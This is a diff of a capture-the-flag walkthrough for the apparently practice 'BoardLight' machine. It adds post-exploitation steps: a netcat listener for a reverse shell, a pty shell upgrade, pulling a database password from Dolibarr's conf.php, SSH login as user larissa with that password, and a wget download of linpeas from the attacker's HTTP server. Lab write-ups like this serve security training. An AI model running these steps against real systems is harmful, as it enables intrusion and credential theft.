@@ -1,4 +1,4 @@
-# BoardLight
+![image](https://github.com/user-attachments/assets/931b25c3-641a-48fc-bcc8-2f31982e8618)# BoardLight
 
 ![image](https://github.com/user-attachments/assets/2b73bf05-62a1-4243-8386-b94047464da6)
 
@@ -79,13 +79,15 @@ My site crashes VERY often, so it needs to be recreated every time...
 ```
 Instead of my ip, put yours, (you can view it using the command `ip a`, it will be in tun0).
 
-we launch **netcat** through the terminal:
+we launch **netcat** through the shell:
 
 ```
 nc -lvnp 9999
 ```
 
 Now, save it again and click on the binoculars and we get access to the server!.
+
+# Shell
 
 ![image](https://github.com/user-attachments/assets/791538f2-97cf-4cea-873c-d81609b06067)
 
@@ -94,5 +96,52 @@ For convenience, we create a terminal interface.
 ```
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 ```
+
+In the '/home` directory, we see the user *larissa*, and of course we do not have access to her directory:
+
+![image](https://github.com/user-attachments/assets/0f6d5c46-3097-40ed-8f80-18feca2f3e14)
+
+![image](https://github.com/user-attachments/assets/7fdfcaa2-e6cf-4018-97f6-a549d3029468)
+
+I Googled where the entire dolibarr database is located and as you can see on the [wiki](https://wiki.dolibarr.org/index.php?title=Configuration_file) it says that it is in a file `conf.php `
+
+![image](https://github.com/user-attachments/assets/bbbffe37-269f-4b52-a5f9-b4f5391f0581)
+
+And here is our password and it looks like it is for **larissa**. We have an open **ssh**, so let's try to log in through it.
+
+## Shell as larissa (SSH)
+
+use `larissa:serverfun2$2023!!`
+
+```
+ssh larissa@10.10.11.11
+```
+
+![image](https://github.com/user-attachments/assets/70b59c50-031c-47a3-be6e-9e7caf9903de)
+
+so we entered as larissa.
+
+![image](https://github.com/user-attachments/assets/e45cfbb3-45e7-4181-8606-381362e1662e)
+
+ And here our ***user flag***. (and other people's exploits ;) )
+
+ ![image](https://github.com/user-attachments/assets/d273b685-0a62-4f24-9058-4ae85dbb241c)
+
+It's sad. But let's transfer our **lineass** to the server (I deleted all other people's files).
+
+Launching our server for transfer:
+
+```
+sudo python3 -m http.server 9999
+```
+and get our linpeas:
+
+```
+wget http://10.10.14.181:9999/linpeas.sh
+```
+
+launch linpeas with `./linpeas.sh`.
+
+![image](https://github.com/user-attachments/assets/6d87ffc0-0635-4f19-b7cd-4f056140663d)
 
 
